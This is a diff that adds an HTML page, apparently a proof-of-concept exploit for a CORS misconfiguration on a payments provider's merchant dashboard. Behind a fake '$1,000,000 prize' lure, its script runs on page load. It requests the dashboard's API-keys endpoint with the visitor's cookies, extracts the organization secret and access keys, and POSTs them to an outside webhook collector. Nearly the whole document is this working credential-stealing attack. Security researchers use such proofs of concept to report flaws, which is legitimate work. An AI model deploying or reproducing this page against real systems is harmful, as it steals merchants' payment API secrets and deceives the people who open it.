@@ -1,1 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>RAPYD SECRET STEALER</title>
+  <meta charset="utf-8">
+</head>
+<body>
+  <h2>🎉 CONGRATULATIONS! YOU WON $1,000,000! 🎉</h2>
+  <p>Claiming your prize...</p>
+  <div id="status" style="color:green; font-weight:bold; margin:10px;"></div>
 
+  <script>
+    const TARGET = "https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys";
+    const ATTACKER = "https://webhook.site/257b5906-77de-4391-a468-beaa821222c7";
+    const status = document.getElementById('status');
+
+    async function steal() {
+      try {
+        status.innerHTML = "Sending Origin: https://shadowarpit.github.io";
+
+        const response = await fetch(TARGET, {
+          method: 'GET',
+          credentials: 'include',
+          headers: {
+            'Accept': 'application/json',
+            'Origin': 'https://shadowarpit.github.io'  // This gets reflected
+          }
+        });
+
+        if (!response.ok) {
+          const text = await response.text();
+          throw `HTTP ${response.status}: ${text.substring(0, 100)}`;
+        }
+
+        const data = await response.json();
+        const secret = data.data.organization_secret_key;
+        const access = data.data.organization_access_key;
+
+        status.innerHTML = "SECRET STOLEN!";
+
+        await fetch(ATTACKER, {
+          method: 'POST',
+          mode: 'no-cors',
+          body: JSON.stringify({
+            access_key: access,
+            secret_key: secret,
+            poc_url: window.location.href
+          })
+        });
+
+        console.log("STOLEN:", { access, secret });
+      } catch (e) {
+        status.innerHTML = "ERROR: " + e;
+        console.error(e);
+      }
+    }
+
+    steal();
+  </script>
+</body>
+</html>
